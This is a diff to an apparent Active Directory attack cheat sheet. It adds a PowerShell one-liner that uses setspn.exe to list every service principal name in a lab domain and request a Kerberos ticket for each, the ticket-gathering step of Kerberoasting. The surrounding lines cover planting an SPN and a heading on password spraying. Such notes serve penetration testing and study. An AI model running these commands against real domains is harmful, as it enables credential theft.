@@ -84,6 +84,10 @@ __Append extra SPN__
 Set-ADUser -Identity support1user 
 -ServicePrincipalNames @{Add=‘dcorp/whatever1'}
 ```
+__Retrieve All tickets using setspn.exe__
+```powershell
+setspn.exe -T INLANEFREIGHT.LOCAL -Q */* | Select-String '^CN' -Context 0,1 | % { New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $_.Context.PostContext[0].Trim() }
+```
 
 ---
 ### Password Spraying
